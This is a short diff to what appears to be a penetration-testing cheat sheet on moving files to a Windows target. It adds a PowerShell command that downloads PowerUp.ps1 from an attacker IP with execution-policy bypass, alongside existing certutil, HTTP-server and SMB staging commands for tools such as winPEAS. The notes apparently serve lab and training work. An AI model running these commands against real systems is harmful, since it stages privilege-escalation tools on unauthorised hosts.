@@ -18,7 +18,8 @@
 ### File transfer via web server
 0. `python3 -m http.server 8080` from linux
 1. `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://myIP:80/winpeas.exe', 'winpeas.exe')` from window
-2. `certutil.exe -urlcache -f -split http://$IP:80/winpeas.exe ` from window
+2. `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.55/PowerUp.ps1', 'PowerUp.ps1') -exec bypass`
+3. `certutil.exe -urlcache -f -split http://$IP:80/winpeas.exe ` from window
 ### File Transfer via SMB
 0. `mkdir share` and move files to transfer
 1. `impacket-smbserver smb share/ ` from linux
